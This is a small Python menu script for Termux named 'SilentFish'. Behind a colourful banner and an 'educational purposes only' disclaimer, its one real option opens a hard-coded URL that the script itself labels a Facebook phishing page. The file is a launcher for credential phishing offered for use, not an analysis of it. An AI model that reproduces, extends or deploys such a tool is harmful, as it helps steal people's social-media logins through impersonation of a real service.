from colorama import Fore, Style
import os
import time

# Constants
PHISHING_URL = "https://webfacebook.vercel.app"
TOOL_NAME = "SilentFish"
DEVELOPER_INFO = "Developed by: Yamman Butt\nTool Version: 1.0"

# Clean and Clear ASCII Art Logo
SILENTFISH_LOGO = f"""
{Fore.CYAN}
   ███████╗██╗██╗     ███████╗███████╗███╗   ███╗███████╗████████╗███████╗
   ██╔════╝██║██║     ██╔════╝██╔════╝████╗ ████║██╔════╝╚══██╔══╝██╔════╝
   █████╗  ██║██║     █████╗  █████╗  ██╔████╔██║█████╗     ██║   █████╗  
   ██╔══╝  ██║██║     ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  
   ███████╗██║███████╗███████╗███████╗██║ ╚═╝ ██║███████╗   ██║   ███████╗
   ╚══════╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝
{Style.RESET_ALL}
"""

# Disclaimer
DISCLAIMER = f"""
{Fore.YELLOW}This tool is designed for ethical and educational purposes only. 
Unauthorized use of this tool for malicious activities is strictly prohibited 
and may result in legal consequences. Use responsibly.{Style.RESET_ALL}
"""

# Styled Banner
def show_banner():
    os.system("clear")
    print(SILENTFISH_LOGO)
    print(Style.BRIGHT + Fore.GREEN + "=" * 70)
    print(Fore.GREEN + f"                    Welcome to {TOOL_NAME} v1.0")
    print(Fore.GREEN + "=" * 70 + Style.RESET_ALL)

# Styled Disclaimer
def show_disclaimer():
    print(DISCLAIMER)

# Menu Display
def show_menu():
    print(Style.BRIGHT + Fore.GREEN + "\n[ MAIN MENU ]" + Style.RESET_ALL)
    print(Fore.MAGENTA + "1. Facebook ")
    print("2. Exit" + Style.RESET_ALL)

# Option: Open Phishing Page
def open_facebook():
    print(Fore.YELLOW + f"\nRedirecting to: {PHISHING_URL}" + Style.RESET_ALL)
    time.sleep(2)
    os.system(f"termux-open-url {PHISHING_URL}")

# Exit Program
def exit_tool():
    print(Fore.GREEN + "\nExiting the tool. Stay safe and ethical!" + Style.RESET_ALL)
    time.sleep(1)
    os.system("clear")
    exit()

# Main Function
def main():
    show_banner()
    show_disclaimer()

    while True:
        show_menu()
        choice = input(Fore.CYAN + "\nEnter your choice: " + Style.RESET_ALL)
        if choice == "1":
            open_facebook()
        
        elif choice == "2":
            exit_tool()
        else:
            print(Fore.RED + "Invalid choice. Please try again!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
